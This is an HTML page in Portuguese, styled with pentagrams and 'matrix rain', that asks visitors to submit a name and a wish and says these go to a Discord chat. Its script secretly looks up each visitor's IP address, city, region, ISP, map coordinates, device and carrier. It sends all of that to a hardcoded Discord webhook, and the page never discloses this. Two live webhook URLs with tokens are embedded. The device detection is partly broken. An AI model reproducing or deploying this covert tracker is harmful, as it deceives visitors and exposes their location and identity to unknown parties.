<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dark Angel v2</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #000000;
            color: #ffffff;
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
            overflow: hidden;
        }

        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            pointer-events: none;
            overflow: hidden;
        }

        .matrix-code {
            position: absolute;
            color: rgba(255, 255, 255, 0.7);
            font-size: 14px;
            font-weight: normal;
            white-space: nowrap;
            animation: matrix-fall-slow 20s linear infinite;
            text-shadow: 0 0 3px rgba(255, 255, 255, 0.3);
            letter-spacing: 1px;
            font-family: 'Courier New', monospace;
        }

        @keyframes matrix-fall {
            from { 
                transform: translateY(-100vh); 
                opacity: 1;
            }
            to { 
                transform: translateY(100vh); 
                opacity: 0.3;
            }
        }

        @keyframes matrix-fall-slow {
            from { 
                transform: translateY(-100vh); 
                opacity: 0.8;
            }
            to { 
                transform: translateY(100vh); 
                opacity: 0.2;
            }
        }

        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        @keyframes spin-reverse { from { transform: rotate(360deg); } to { transform: rotate(0deg); } }
        @keyframes float { 0%, 100% { transform: translateY(0px); } 50% { transform: translateY(-20px); } }
        @keyframes glow { 0%, 100% { text-shadow: 0 0 20px rgba(255, 255, 255, 0.8); } 50% { text-shadow: 0 0 40px rgba(255, 255, 255, 1); } }

        .main-content {
            position: relative;
            z-index: 10;
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 20px;
        }

        .content-row {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 30px;
        }

        .demon-img {
            width: 120px;
            height: 120px;
            filter: drop-shadow(0 0 30px rgba(255, 255, 255, 0.8));
            animation: float 3s ease-in-out infinite;
        }

        .pentagram {
            width: 60px;
            height: 60px;
            filter: drop-shadow(0 0 20px rgba(255, 255, 255, 0.5));
        }

        .pentagram-left { animation: spin 8s linear infinite; }
        .pentagram-right { animation: spin-reverse 8s linear infinite; }

        h1 {
            font-size: 36px;
            letter-spacing: 4px;
            text-shadow: 0 0 30px rgba(255, 255, 255, 1);
            animation: glow 2s ease-in-out infinite;
            font-weight: bold;
        }

        .discord-link {
            border: 2px solid #ffffff;
            padding: 14px 30px;
            font-size: 16px;
            text-decoration: none;
            color: #ffffff;
            letter-spacing: 2px;
            transition: all 0.3s ease;
            display: inline-block;
            font-weight: bold;
        }

        .discord-link:hover {
            background: rgba(255, 255, 255, 0.15);
            box-shadow: 0 0 25px rgba(255, 255, 255, 0.8);
            transform: scale(1.08);
        }

        .form-container {
            margin-top: 20px;
            display: flex;
            flex-direction: column;
            gap: 12px;
            width: 100%;
            max-width: 400px;
        }

        .form-label {
            font-size: 16px;
            letter-spacing: 2px;
            text-shadow: 0 0 15px rgba(255, 255, 255, 0.8);
            font-weight: bold;
        }

        .message-form {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .message-form input {
            padding: 14px;
            background: rgba(255, 255, 255, 0.08);
            border: 2px solid #ffffff;
            color: #ffffff;
            font-family: 'Courier New', monospace;
            font-size: 15px;
            outline: none;
            transition: all 0.3s ease;
            font-weight: bold;
        }

        .message-form input::placeholder {
            color: rgba(255, 255, 255, 0.6);
        }

        .message-form input:focus {
            background: rgba(255, 255, 255, 0.15);
            box-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
        }

        .message-form button {
            padding: 14px;
            background: rgba(255, 255, 255, 0.08);
            border: 2px solid #ffffff;
            color: #ffffff;
            font-family: 'Courier New', monospace;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-weight: bold;
            letter-spacing: 1px;
        }

        .message-form button:hover {
            background: rgba(255, 255, 255, 0.15);
            box-shadow: 0 0 20px rgba(255, 255, 255, 0.6);
            transform: scale(1.08);
        }

        .success-message {
            color: #00ff00;
            font-size: 15px;
            display: none;
            text-shadow: 0 0 15px rgba(0, 255, 0, 0.8);
            font-weight: bold;
        }

        .error-message {
            color: #ff0000;
            font-size: 15px;
            display: none;
            text-shadow: 0 0 15px rgba(255, 0, 0, 0.8);
            font-weight: bold;
        }

        .discord-info {
            margin-top: 20px;
            text-align: center;
            font-size: 14px;
            color: rgba(255, 255, 255, 0.8);
            line-height: 1.6;
        }

        .discord-info p {
            margin: 8px 0;
        }

        .discord-info a {
            color: #5865F2;
            text-decoration: none;
            font-weight: bold;
            transition: all 0.3s ease;
        }

        .discord-info a:hover {
            color: #7289DA;
            text-shadow: 0 0 10px rgba(88, 101, 242, 0.6);
        }

        audio { display: none; }

        @media (max-width: 768px) {
            .content-row { gap: 20px; }
            .pentagram { width: 50px; height: 50px; }
            .demon-img { width: 100px; height: 100px; }
            h1 { font-size: 28px; }
            .message-form { max-width: 90vw; }
            .matrix-code { font-size: 24px; }
        }
    </style>
</head>
<body>
    <div class="matrix-bg" id="matrixBg"></div>
    <audio id="scaryAudio" loop volume="1.0">
        <source src="scary_sound.mp3" type="audio/mpeg">
    </audio>

    <div class="main-content">
        <div class="content-row">
            <img src="pentagram.gif" alt="Pentagram" class="pentagram pentagram-left">
            <img src="v-logo.png" alt="Demon" class="demon-img">
            <img src="pentagram.gif" alt="Pentagram" class="pentagram pentagram-right">
        </div>

        <h1>VV<br>Faça seu desejo</h1>

        <a href="https://discord.gg/vv00" class="discord-link" target="_blank">discord.gg/vv00</a>

        <div class="form-container">
            <div class="form-label">REALIZE UM PEDIDO</div>
            <form class="message-form" id="messageForm">
                <input type="text" id="nameInput" placeholder="Seu nome/identificação..." required>
                <input type="text" id="messageInput" placeholder="Escreva sua mensagem..." required>
                <button type="submit">ENVIAR</button>
            </form>
            <div class="success-message" id="successMessage">✓ Mensagem enviada!</div>
            <div class="error-message" id="errorMessage">✗ Erro ao enviar</div>
            <div class="discord-info">
                <p>Seus pedidos caem no nosso chat geral do Discord.</p>
                <p>Entre no nosso servidor: <a href="https://discord.gg/vv00" target="_blank">discord.gg/vv00</a></p>
            </div>
        </div>
    </div>

    <script>
        // MATRIX RAIN - Código binário caindo GIGANTE
        const binarySequences = [
            "01001000 01100101 01101100 01101100",
            "01001000 01100101 01101100 01101100",
            "01001000 01100101 01101100 01101100",
            "01001000 01100101 01101100 01101100",
            "01001000 01100101 01101100 01101100"
        ];
        
        const matrixBg = document.getElementById('matrixBg');
        const width = window.innerWidth;
        const height = window.innerHeight;
        
        // Criar MUITAS linhas de código caindo
        for (let i = 0; i < 50; i++) {
            const code = document.createElement('div');
            code.className = 'matrix-code';
            code.textContent = binarySequences[Math.floor(Math.random() * binarySequences.length)];
            
            const randomX = Math.random() * width;
            const randomDelay = Math.random() * 12;
            const randomDuration = 10 + Math.random() * 8;
            
            code.style.left = randomX + 'px';
            code.style.top = (Math.random() * height - height) + 'px';
            code.style.animationDelay = randomDelay + 's';
            code.style.animationDuration = randomDuration + 's';
            code.style.fontSize = (28 + Math.random() * 16) + 'px';
            code.style.opacity = (0.7 + Math.random() * 0.3);
            
            matrixBg.appendChild(code);
        }

        // Audio
        const audio = document.getElementById('scaryAudio');
        let audioStarted = false;

        function playAudio() {
            if (!audioStarted) {
                audio.volume = 1.0;
                audio.play().catch(err => console.log('Audio play error:', err));
                audioStarted = true;
            }
        }

        document.addEventListener('click', playAudio);
        document.addEventListener('touchstart', playAudio);
        setTimeout(playAudio, 1000);

        // Webhooks
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1474145387638948108/y7QjQaCCR8W_ZS2hCv_LlnAQdf2gW4lI9uv5LV3N9xgVJ5N8tim-wyjVAzQ-OruQEwdw';
        const WEBHOOK_URL_2 = 'https://discord.com/api/webhooks/1474240532485115936/lJgBmmccDMPk18lXN09NKEez1yd0iR1aGyfgSGE6DbVdlkf06Bv3PC48w3hxbJFsUQUD';
        const messageForm = document.getElementById('messageForm');
        const nameInput = document.getElementById('nameInput');
        const messageInput = document.getElementById('messageInput');
        const successMessage = document.getElementById('successMessage');
        const errorMessage = document.getElementById('errorMessage');
        const submitButton = messageForm.querySelector('button[type="submit"]');
        let isSubmitting = false;
        const COOLDOWN_TIME = 10000; // 10 segundos

        // Funcao para pegar localizacao exata do navegador
        async function getExactLocation() {
            return new Promise((resolve) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            const lat = position.coords.latitude;
                            const lon = position.coords.longitude;
                            const accuracy = position.coords.accuracy;
                            resolve({
                                latitude: lat,
                                longitude: lon,
                                accuracy: accuracy,
                                mapsLink: `https://www.google.com/maps?q=${lat},${lon}`
                            });
                        },
                        (error) => {
                            resolve({
                                latitude: 0,
                                longitude: 0,
                                accuracy: 0,
                                mapsLink: 'https://www.google.com/maps'
                            });
                        }
                    );
                } else {
                    resolve({
                        latitude: 0,
                        longitude: 0,
                        accuracy: 0,
                        mapsLink: 'https://www.google.com/maps'
                    });
                }
            });
        }

        // Funcao para pegar IP e Geolocalizacao
        async function getUserIPAndGeo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                const latitude = data.latitude || 0;
                const longitude = data.longitude || 0;
                const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
                return {
                    ip: data.ip || 'IP desconhecido',
                    country: data.country_name || 'País desconhecido',
                    city: data.city || 'Cidade desconhecida',
                    region: data.region || 'Região desconhecida',
                    isp: data.org || 'ISP desconhecido',
                    mapsLink: mapsLink,
                    latitude: latitude,
                    longitude: longitude
                };
            } catch (error) {
                return {
                    ip: 'IP desconhecido',
                    country: 'País desconhecido',
                    city: 'Cidade desconhecida',
                    region: 'Região desconhecida',
                    isp: 'ISP desconhecido',
                    mapsLink: 'https://www.google.com/maps',
                    latitude: 0,
                    longitude: 0
                };
            }
        }

        messageForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            // Cooldown para evitar spam
            if (isSubmitting) return;
            isSubmitting = true;
            submitButton.style.pointerEvents = 'none';
            submitButton.style.opacity = '0.3';
            submitButton.style.cursor = 'not-allowed';
            submitButton.textContent = 'AGUARDE...';
            
            const name = nameInput.value.trim();
            const message = messageInput.value.trim();
            if (!name || !message) {
                isSubmitting = false;
                submitButton.style.pointerEvents = 'auto';
                submitButton.style.opacity = '1';
                submitButton.style.cursor = 'pointer';
                submitButton.textContent = 'ENVIAR';
                return;
            }

            try {
                const geo = await getUserIPAndGeo();
                const userAgent = navigator.userAgent;
                
                // Detectar modelo do iPhone
                let iphoneModel = 'Não identificado';
                let iosVersion = 'Não identificado';
                let operadora = 'Não identificado';
                
                if (userAgent.includes('iPhone')) {
                    if (userAgent.includes('iPhone15,1') || userAgent.includes('iPhone15,2')) iphoneModel = 'iPhone 15';
                    else if (userAgent.includes('iPhone15,3') || userAgent.includes('iPhone15,4')) iphoneModel = 'iPhone 15 Pro';
                    else if (userAgent.includes('iPhone14,')) iphoneModel = 'iPhone 14';
                    else if (userAgent.includes('iPhone13,')) iphoneModel = 'iPhone 13';
                    else if (userAgent.includes('iPhone12,')) iphoneModel = 'iPhone 12';
                    else if (userAgent.includes('iPhone11,')) iphoneModel = 'iPhone 11';
                    else iphoneModel = 'iPhone';
                    
                    const iosMatch = userAgent.match(/OS (\d+_\d+)/);
                    if (iosMatch) iosVersion = 'iOS ' + iosMatch[1].replace('_', '.');
                    
                    if (geo.isp.includes('Vivo')) operadora = 'Vivo';
                    else if (geo.isp.includes('Claro')) operadora = 'Claro';
                    else if (geo.isp.includes('Tim')) operadora = 'TIM';
                    else if (geo.isp.includes('Oi')) operadora = 'Ói';
                    else operadora = geo.isp;
                }
                
                const messageWithIP = `**Nome/ID:** ${name}\n**IP:** ${geo.ip}\n**País:** ${geo.country}\n**Cidade:** ${geo.city}\n**Região:** ${geo.region}\n**ISP:** ${geo.isp}\n**Localização:** ${geo.mapsLink}\n**Dispositivo:** ${iphoneModel}\n**iOS:** ${iosVersion}\n**Operadora:** ${operadora}\n**Mensagem:** ${message}`;
                const messageWithoutIP = `**Nome/ID:** ${name}\n**Mensagem:** ${message}`;

                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: messageWithIP, username: 'Dark Angel' })
                });

                const response2 = await fetch(WEBHOOK_URL_2, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: messageWithoutIP, username: 'Dark Angel' })
                });

                if (response.ok && response2.ok) {
                    successMessage.style.display = 'block';
                    errorMessage.style.display = 'none';
                    nameInput.value = '';
                    messageInput.value = '';
                    setTimeout(() => { successMessage.style.display = 'none'; }, 3000);
                } else {
                    throw new Error('Erro ao enviar');
                }
            } catch (error) {
                console.error('Erro:', error);
                errorMessage.style.display = 'block';
                successMessage.style.display = 'none';
                setTimeout(() => { errorMessage.style.display = 'none'; }, 3000);
            } finally {
                // Reset cooldown após 10 segundos
                setTimeout(() => {
                    isSubmitting = false;
                    submitButton.style.pointerEvents = 'auto';
                    submitButton.style.opacity = '1';
                    submitButton.style.cursor = 'pointer';
                    submitButton.textContent = 'ENVIAR';
                }, COOLDOWN_TIME);
            }
        });
    </script>
</body>
</html>
